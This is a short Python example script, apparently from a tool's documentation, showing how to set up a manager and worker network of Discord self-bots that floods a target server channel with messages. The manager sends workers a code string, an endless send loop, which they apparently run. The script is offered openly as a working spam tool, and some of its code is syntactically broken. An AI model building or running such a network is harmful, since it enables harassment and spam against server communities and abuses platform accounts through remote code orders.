"""
Building a simple network that spams messages into a server's channel.
This script merges the two components - manager and workers - into one script, for the sake of simplicity.
Please do not do that.

Requirements:
- core.py
- discord.py-self
- PyGithub
- a channel to manage the network (base channel)
- a channel to send the messages to (target)
"""

# Let's get started
from core import *
base_channel = 0
target_channel = 0

# creating and preparing a manager object
manager = Manager(base_channel)
await manager.prep()

# creating and preparing a worker object
worker = Worker(manager.bot.user.id, base_channel)
await worker.prep()

# let's get the worker to start listening
await worker.listen()

# it can now listen for orders! let's have it spam messages to the target channel
msg = "hello!"
code = f"while True:
  await {target_channel}.send({msg})"

await manager.order(code)

# great, now let's run our bots

loop = asyncio.get_event_loop()
loop.create_task(manager.bot.start("token"))
loop.create_task(worker.bot.start("token"))
loop.run_forever()

"""
if you're running each bot in a separate script or file, you can just do it the normal way, e.g.:
bot.run("token")
"""
